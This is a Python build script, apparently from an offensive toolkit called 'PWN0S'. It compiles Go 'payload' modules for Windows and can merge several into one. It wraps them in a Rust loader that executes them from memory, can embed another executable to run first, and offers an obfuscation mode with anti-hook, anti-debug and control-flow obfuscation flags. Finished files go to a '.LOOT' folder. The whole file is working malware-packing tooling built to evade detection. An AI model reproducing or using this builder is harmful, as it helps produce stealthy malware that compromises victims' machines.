import os
import subprocess
import sys
import tempfile
from pathlib import Path
import argparse
import shutil
import re

def compile_go(go_path, output_exe):
    env = os.environ.copy()
    env["GOOS"] = "windows"
    env["GOARCH"] = "amd64"
    result = subprocess.run(["go", "build", "-o", output_exe, go_path], env=env)
    if result.returncode != 0 or not os.path.isfile(output_exe):
        print(f"[Error] Go build failed for {go_path}")
        sys.exit(1)
    print(f"Built {output_exe}")
    return output_exe

def generate_rust_memexec(go_exe_path, output_exe, embed_exe_path=None):
    with open(go_exe_path, "rb") as f:
        go_bytes = f.read()
    go_bytes_array = ','.join(str(b) for b in go_bytes)
    embed_code = ""
    embed_decl = ""
    if embed_exe_path:
        with open(embed_exe_path, "rb") as f:
            embed_bytes = f.read()
        embed_bytes_array = ','.join(str(b) for b in embed_bytes)
        embed_decl = f"const EMBEDDED_EXE: &[u8] = &[{embed_bytes_array}];"
        embed_code = """
    // Run embedded EXE first
    unsafe {
        memexec::memexec_exe(EMBEDDED_EXE).expect("Failed to execute embedded EXE");
    }
"""
    rust_code = f'''
use memexec;
{embed_decl}
const GO_PAYLOAD: &[u8] = &[{go_bytes_array}];
fn main() {{
{embed_code}    unsafe {{
        memexec::memexec_exe(GO_PAYLOAD).expect("Failed to execute PE from memory");
    }}
}}
'''
    temp_dir = tempfile.mkdtemp(prefix="memexec_")
    try:
        src_dir = Path(temp_dir) / "src"
        src_dir.mkdir(parents=True, exist_ok=True)
        main_rs = src_dir / "main.rs"
        main_rs.write_text(rust_code)
        cargo_toml = Path(temp_dir) / "Cargo.toml"
        cargo_toml.write_text("""
[package]
name = "payload"
version = "0.1.0"
edition = "2018"
[dependencies]
memexec = { git = "https://github.com/DmitrijVC/memexec", version = "0.3" }
""")
        cargo_config_dir = Path(temp_dir) / ".cargo"
        cargo_config_dir.mkdir(exist_ok=True)
        config_toml = cargo_config_dir / "config.toml"
        config_toml.write_text("""
[target.x86_64-pc-windows-gnu]
linker = "x86_64-w64-mingw32-gcc"
""")
        loot_dir = Path.cwd() / ".LOOT"
        loot_dir.mkdir(exist_ok=True)
        final_exe = loot_dir / output_exe
        if os.environ.get('PWNOS_DOCKER_OBFUSCATE', '0') == '1':
            docker_image = "ghcr.io/joaovarelas/obfuscator-llvm-16.0:latest"
            user_project_dir = str(temp_dir)
            docker_cmd = [
                "docker", "run", "--rm",
                "--platform", "linux/amd64",
                "-e", "CARGO_BUILD_JOBS=1",
                "-v", f"{user_project_dir}:/projects/",
                "-w", "/projects/",
                docker_image,
                "cargo", "rustc",
                "--target", "x86_64-pc-windows-gnu",
                "--release",
                "--",
                "-Cdebuginfo=0",
                "-Cstrip=symbols",
                "-Cpanic=abort",
                "-Copt-level=3",
                "-Cllvm-args=-enable-acdobf",
                "-Cllvm-args=-enable-antihook",
                "-Cllvm-args=-enable-adb",
                "-Cllvm-args=-enable-bcfobf",
                "-Cllvm-args=-enable-splitobf",
                "-Cllvm-args=-enable-subobf",
                "-Cllvm-args=-enable-fco",
                "-Cllvm-args=-enable-constenc"
            ]
            result = subprocess.run(docker_cmd)
            if result.returncode != 0:
                print("[Error] Rust build/obfuscation failed")
                sys.exit(1)
            built_exe = Path(temp_dir) / "target" / "x86_64-pc-windows-gnu" / "release" / "payload.exe"
            os.replace(built_exe, final_exe)
            print(f"Final EXE created at: {final_exe}")
        else:
            result = subprocess.run([
                "cargo", "build", "--release", "--target", "x86_64-pc-windows-gnu"
            ], cwd=temp_dir)
            if result.returncode != 0:
                print("[Error] Native Rust build failed")
                sys.exit(1)
            built_exe = Path(temp_dir) / "target" / "x86_64-pc-windows-gnu" / "release" / "payload.exe"
            os.replace(built_exe, final_exe)
            print(f"Final EXE created at: {final_exe}")
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)

def merge_go_modules(go_files, merged_go_path):
    """
    Merges multiple Go files into one, so their main logic runs in order.
    Writes the merged Go file to merged_go_path.
    Automatically removes unused imports.
    """
    all_imports = set()
    func_bodies = []
    main_funcs = []
    used_names = set()
    func_name_to_body = {}

    def unique_func_name(base, used):
        i = 1
        name = base
        while name in used:
            name = f"{base}_{i}"
            i += 1
        used.add(name)
        return name

    def extract_functions(src):
        """Extract all top-level functions from Go source code using a line-based parser."""
        funcs = []
        lines = src.splitlines()
        in_func = False
        brace_count = 0
        func_lines = []
        func_name = None
        for idx, line in enumerate(lines):
            if not in_func:
                match = re.match(r'func\s+([\w]+)\s*\(', line)
                if match:
                    in_func = True
                    func_name = match.group(1)
                    func_lines = [line]
                    brace_count = line.count('{') - line.count('}')
                    if brace_count == 0 and line.rstrip().endswith('}'): 
                        funcs.append((func_name, '\n'.join(func_lines)))
                        in_func = False
                        func_lines = []
                        func_name = None
            elif in_func:
                func_lines.append(line)
                brace_count += line.count('{') - line.count('}')
                if brace_count == 0:
                    funcs.append((func_name, '\n'.join(func_lines)))
                    in_func = False
                    func_lines = []
                    func_name = None
        return funcs

    for idx, go_file in enumerate(go_files):
        with open(go_file, 'r') as f:
            src = f.read()
        imports = set()
        import_block = re.findall(r'import \((.*?)\)', src, re.DOTALL)
        if import_block:
            for line in import_block[0].splitlines():
                line = line.strip().strip('"')
                if line:
                    imports.add(line)
        else:
            single_imports = re.findall(r'import\s+"([^"]+)"', src)
            imports.update(single_imports)
        all_imports.update(imports)
        for func_name, body in extract_functions(src):
            if func_name == "main":
                new_name = unique_func_name(f"main_{os.path.splitext(os.path.basename(go_file))[0]}", used_names)
                body = re.sub(r'func\s+main\s*\(', f'func {new_name}(', body, count=1)
                main_funcs.append((new_name, body))
            else:
                func_bodies.append(body.strip())
            func_name_to_body[func_name] = body.strip()
    merged_code = 'package main\n\n'
    if all_imports:
        if len(all_imports) > 1:
            merged_code += 'import (\n'
            for imp in sorted(all_imports):
                merged_code += f'\t"{imp}"\n'
            merged_code += ')\n\n'
        else:
            merged_code += f'import "{list(all_imports)[0]}"\n\n'
    for helper in func_bodies:
        merged_code += helper + '\n\n'
    for func_name, main_body in main_funcs:
        merged_code += main_body.strip() + '\n\n'
    merged_code += 'func main() {\n'
    for func_name, _ in main_funcs:
        merged_code += f'\t{func_name}()\n'
    merged_code += '}\n'
    merged_code = remove_unused_imports(merged_code)
    with open(merged_go_path, 'w') as f:
        f.write(merged_code)

def remove_unused_imports(go_code):
    """
    Remove unused imports from a Go source string.
    """
    import_block = re.search(r'import \((.*?)\)', go_code, re.DOTALL)
    if not import_block:
        single_imports = re.findall(r'import\s+"([^"]+)"', go_code)
        for imp in single_imports:
            if not re.search(r'\b' + re.escape(imp.split('/')[-1]) + r'\b', go_code.split('import')[1]):
                go_code = re.sub(r'import\s+"' + re.escape(imp) + r'"\n', '', go_code)
        return go_code
    block = import_block.group(1)
    imports = [line.strip().strip('"') for line in block.splitlines() if line.strip()]
    used_imports = []
    for imp in imports:
        symbol = imp.split('/')[-1]
        if re.search(r'\b' + re.escape(symbol) + r'\b', go_code.split('import')[1]):
            used_imports.append(imp)
    if used_imports:
        new_block = 'import (\n' + ''.join([f'\t"{imp}"\n' for imp in used_imports]) + ')'
        go_code = re.sub(r'import \((.*?)\)', new_block, go_code, flags=re.DOTALL)
    else:
        go_code = re.sub(r'import \((.*?)\)\n', '', go_code, flags=re.DOTALL)
    return go_code

def main():
    parser = argparse.ArgumentParser(description="Go-to-memexec EXE builder for PWN0S")
    parser.add_argument("--go_file", type=str, help="Path to Go file")
    parser.add_argument("--output_exe", type=str, help="Output EXE name (in .LOOT)")
    parser.add_argument("--embed", type=str, help="Path to EXE to embed and run before this module")
    parser.add_argument("--go-only", action="store_true", help="Only build Go file to EXE, no Rust wrapping")
    parser.add_argument("--merge", nargs='+', help="List of Go files to merge and run in order (last arg is output exe)")
    parser.add_argument("--obfuscate", action="store_true", help="Enable obfuscation (use Docker/Rust)")
    args = parser.parse_args()
    if args.obfuscate:
        os.environ['PWNOS_DOCKER_OBFUSCATE'] = '1'
    else:
        os.environ['PWNOS_DOCKER_OBFUSCATE'] = '0'
    if args.merge:
        *go_files, output_exe = args.merge
        with tempfile.TemporaryDirectory() as tmpdir:
            merged_go = os.path.join(tmpdir, "merged.go")
            merge_go_modules(go_files, merged_go)
            go_exe = os.path.join(tmpdir, "payload.exe")
            compile_go(merged_go, go_exe)
            if args.obfuscate:
                generate_rust_memexec(go_exe, output_exe)
            else:
                loot_dir = Path.cwd() / ".LOOT"
                loot_dir.mkdir(exist_ok=True)
                final_exe = loot_dir / output_exe
                os.replace(go_exe, final_exe)
                print(f"Final EXE created at: {final_exe}")
        return
    if args.go_only:
        if not args.go_file or not args.output_exe:
            print("--go_file and --output_exe are required with --go-only")
            sys.exit(1)
        compile_go(args.go_file, args.output_exe)
        return
    else:
        if not args.go_file or not args.output_exe:
            print("--go_file and --output_exe are required for default build path")
            sys.exit(1)
        with tempfile.TemporaryDirectory() as tmpdir:
            go_exe = os.path.join(tmpdir, "payload.exe")
            compile_go(args.go_file, go_exe)
            if args.obfuscate:
                generate_rust_memexec(go_exe, args.output_exe, embed_exe_path=args.embed)
            else:
                loot_dir = Path.cwd() / ".LOOT"
                loot_dir.mkdir(exist_ok=True)
                final_exe = loot_dir / args.output_exe
                os.replace(go_exe, final_exe)
                print(f"Final EXE created at: {final_exe}")

if __name__ == "__main__":
    main()